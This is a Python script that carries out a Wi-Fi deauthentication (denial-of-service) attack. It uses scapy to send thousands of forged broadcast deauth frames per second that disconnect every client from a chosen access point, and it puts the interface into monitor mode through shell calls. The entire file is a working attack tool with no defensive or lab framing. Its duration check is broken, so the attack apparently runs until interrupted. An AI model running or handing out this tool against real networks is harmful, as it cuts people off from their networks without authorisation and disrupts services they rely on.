#!/usr/bin/env python3
# command to run this file 
# python wifi_ddos.py -i wlan0 -g XX:XX:XX:XX:XX:XX --bssid YY:YY:YY:YY:YY:YY

import subprocess
import sys

def install_module(module_name):
    try:
        import importlib
        importlib.import_module(module_name)
    except ImportError:
        print(f"Module '{module_name}' is not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

modules = ["scapy"]
for module in modules:
    install_module(module)

import argparse
import scapy.all as scapy
import os
import time
import threading
import signal
import sys

stop_signal = False

def get_args():
    print("NanduBidhe")
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Attack")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use (monitor mode)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway MAC address")
    parser.add_argument("--bssid", required=True, help="BSSID of the target network")
    parser.add_argument("--channel", type=int, help="Channel of the target network")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds")
    return parser.parse_args()

def signal_handler(sig, frame):
    global stop_signal
    stop_signal = True
    print("\n[*] Stopping attack...")

def broadcast_deauth(interface, gateway, bssid, channel=None, duration=60):
    broadcast = "ff:ff:ff:ff:ff:ff"
    
    print(f"[*] Starting infinite broadcast deauthentication attack on gateway {gateway}")
    print(f"[*] Duration: {duration} seconds")
    print("[*] Press Ctrl+C to stop")
    
    packet_count = 0
    start_time = time.time()
    
    while not stop_signal and time.time() - start_time < duration:
        packet = scapy.RadioTap() / scapy.Dot11(addr1=broadcast, addr2=bssid, addr3=gateway) / scapy.Dot11Deauth(reason=7)
        scapy.sendp(packet, iface=interface, verbose=False, count=500, inter=0.001)
        
        packet = scapy.RadioTap() / scapy.Dot11(addr1=broadcast, addr2=gateway, addr3=bssid) / scapy.Dot11Deauth(reason=7)
        scapy.sendp(packet, iface=interface, verbose=False, count=500, inter=0.001)
        
        packet_count += 1000
        
        current_time = time.time()
        if current_time - start_time >= 1:
            print(f"[+] Sent {packet_count} deauth packets")
            packet_count = 0
            start_time = current_time
        
        time.sleep(0.01)
    
    print("[*] Infinite deauthentication attack stopped")

if __name__ == "__main__":
    args = get_args()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    os.system(f"ifconfig {args.interface} down")
    os.system(f"iwconfig {args.interface} mode monitor")
    os.system(f"ifconfig {args.interface} up")
    
    if args.channel:
        os.system(f"iwconfig {args.interface} channel {args.channel}")
    
    try:
        broadcast_deauth(args.interface, args.gateway, args.bssid, args.channel, args.duration)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)